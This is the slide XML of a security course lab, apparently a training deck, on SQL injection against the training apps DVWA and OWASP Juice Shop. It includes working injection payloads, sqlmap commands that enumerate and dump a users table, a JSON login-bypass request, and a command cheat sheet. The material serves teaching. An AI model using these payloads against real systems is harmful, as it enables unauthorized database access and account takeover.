            </a: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curl -G target/vulnerabilities/sqli/ --data-urlencode "id=1' OR '1'='1"</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ID: 1' OR '1'='1  First name: admin  Surname: admin</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ID: 1' OR '1'='1  First name: Gordon  Surname: Brown</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ID: 1' OR '1'='1  First name: Bob     Surname: Smith</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4650581"/>
            <a:ext cx="10881360" cy="1567339"/>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One request returns exactly the row asked for — completely normal, expected behavior</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second request, with the injected OR clause, dumps every row in the table in one response</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Nothing here required credentials or special access — just a text field that trusted its own input too much</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F172A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="640080"/>
            <a:ext cx="3200400" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0"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TOOL 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 0" descr="preencoded.png">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2377440"/>
            <a:ext cx="1371600" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3886200"/>
            <a:ext cx="3383280" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4846320"/>
            <a:ext cx="3383280" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Automating what you just did by hand — and going much further.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="82296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WHAT IT IS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="1188720"/>
            <a:ext cx="6858000" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A specialized tool that automates the discovery, confirmation, and exploitation of SQL injection vulnerabilities — testing many injection techniques and database engines far faster and more thoroughly than manual testing could.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="3429000"/>
            <a:ext cx="676656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WHEN TO USE IT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="3794760"/>
            <a:ext cx="6858000" cy="237744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Once you've manually confirmed a parameter is injectable</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Enumerating every database and table an injection point can reach</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Dumping table contents automatically once access is confirmed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>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Testing injection techniques (blind, time-based, UNION-based) you would rarely try all of by hand</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11"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2"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SQLMAP · FROM CONFIRMED INJECTION TO FULL DUMP</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Automated Discovery and Extraction</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1508760"/>
            <a:ext cx="10881360" cy="2630170"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2086"/>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990090"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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sqlmap -u "target/vulnerabilities/sqli/?id=1&amp;Submit=Submit" \</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  --cookie="PHPSESSID=...; security=low" --batch --dbs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>back-end DBMS: MySQL &gt;= 5.1</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available databases: dvwa, information_schema</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ sqlmap -u "..." --cookie="..." --batch -D dvwa -T users --dump</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Database: dvwa  Table: users</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>user: admin  password: 5f4dcc3b5aa765d61d8327deb882cf99</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4413250"/>
            <a:ext cx="10881360" cy="180467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same cookie a browser would send is required — sqlmap doesn't log in on its own</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--dbs enumerates every database the injection point can reach</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-D / -T / --dump narrows to one database and table, then extracts its full contents automatically</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Same Flaw, on a Modern Target</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DVWA is deliberately labeled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Every vulnerability is intentional and documented. Real targets never announce themselves this way.</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Juice Shop is different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modern, realistic web application with a JSON REST API — no security-level toggle, no "obviously vulnerable" framing.</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Same underlying logic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 login form still builds a query from user input — this time an email field in a JSON body instead of a URL parameter.</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The payload adapts, the idea doesn't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 OR 1=1-- in the email field achieves the exact same effect as the DVWA payload, just delivered differently.</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The Real Lesson</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Recognizing "untrusted input reaches a database query" matters far more than memorizing any one specific payload syntax.</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JUICE SHOP · LOGIN BYPASS ON A JSON API</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The Same Payload, a Different Delivery Method</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1508760"/>
            <a:ext cx="10881360" cy="2609533"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2102"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0B1220"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1709928"/>
            <a:ext cx="146304" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EF4444"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1170432" y="1709928"/>
            <a:ext cx="146304" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F59E0B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1426464" y="1709928"/>
            <a:ext cx="146304" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10B981"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2011680"/>
            <a:ext cx="10332720" cy="1969452"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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curl -X POST target/rest/user/login -H "Content-Type: application/json" \</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  -d '{"email":"admin@juice-sh.op","password":"wrongpassword"}'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>{"error":"Invalid email or password"}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ curl -X POST target/rest/user/login -H "Content-Type: application/json" \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  -d '{"email":"' OR 1=1--","password":"x"}'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>{"authentication":{"token":"eyJ0eXAiOiJKV1Qi...", "umail":"admin@juice-sh.op"}}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4392612"/>
            <a:ext cx="10881360" cy="1825308"/>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correct password was never known or needed — the injected email field alone broke the query's logic</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The returned JWT is your proof of exactly which account you authenticated as</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-203200">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Decoding the JWT's payload (base64) confirms the role and identity — worth doing live if time allows</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 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1" name="Text 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DECISION GUIDE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Manual Testing vs. sqlmap</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2560320"/>
                <a:gridCol w="4297680"/>
                <a:gridCol w="4023360"/>
              </a:tblGrid>
              <a:tr h="457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pP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Manual injection</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sqlmap</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Best for</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Confirming a parameter is injectable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Full enumeration and extraction once confirmed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Speed</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Slow — you write every payload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Fast — automates dozens of techniques at once</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Understanding gained</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Deep — you see exactly what changed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Shallow, unless you already understand the mechanism</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Needs</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Just a browser or curl</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A confirmed injection point and valid session</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Right order</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1st — confirm it works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2nd — automate the rest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943600"/>
            <a:ext cx="10881360" cy="36576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Skipping straight to sqlmap without understanding the underlying payload is a common shortcut that leaves a real gap in your skills.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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7" name="Text 4"/>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COMMON PITFALLS</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Mistakes That Cost Marks — and Time</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Jumping to sqlmap without confirming manually first</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You lose the understanding of why the payload works, and troubleshooting sqlmap's failures becomes much harder.</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Forgetting the comment terminator</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Leftover query syntax after your injection point can break the whole statement — -- or # cleans that up.</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Assuming injection only happens in URL parameters</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JSON bodies, headers, and cookies can all be injection points on a modern application.</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Trusting a tool's claimed result without verifying it</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Decoding the JWT yourself, rather than just trusting sqlmap or a script's summary, is a genuinely important habit.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5303520"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="530352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05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="525780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Not recognizing the same flaw in an unfamiliar shape</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="558698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The Juice Shop example exists specifically to break the instinct of only recognizing injection in a labeled, DVWA-style form.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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7 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 2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640080" y="804672"/>
            <a:ext cx="10881360" cy="54864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Command Cheat Sheet</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6400800"/>
                <a:gridCol w="4480560"/>
              </a:tblGrid>
              <a:tr h="457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="F8FAFC"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Command</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8FAFC"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>What it does</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>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id=1' OR '1'='1</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Classic injection payload for a numeric-looking parameter</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sqlmap -u "url" --cookie="..." --batch --dbs</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Enumerate databases at a confirmed injection point</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sqlmap -u "url" --cookie="..." -D db -T table --dump</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Dump a specific table's contents</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{"email":"' OR 1=1--","password":"x"}</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Login-bypass payload for a JSON-based login API</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57200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="0F172A"/>
                          </a:solidFill>
                          <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>echo "&lt;jwt-payload&gt;" | base64 -d</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0F172A"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Decode a JWT's payload to confirm the identity obtained</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1250" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri"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6" name="Text 3"/>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HANDS-ON LAB · 2–2.5 HOURS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="804672"/>
            <a:ext cx="10881360" cy="6858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Lab 7: Web Application Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1691640"/>
            <a:ext cx="6675120" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Environment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DVWA (deliberately vulnerable, labeled) and OWASP Juice Shop (modern, realistic, unlabeled) side by side.</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1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Manual SQL injection against DVWA — build and test the payload yourself first.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2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Automate discovery and table extraction with sqlmap against the same confirmed injection point.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Part 3 —  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Bypass the Juice Shop admin login using the same underlying logic on a JSON API.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7635240" y="1691640"/>
            <a:ext cx="3886200" cy="4023360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1882"/>
            </a:avLst>
          </a:prstGeom>
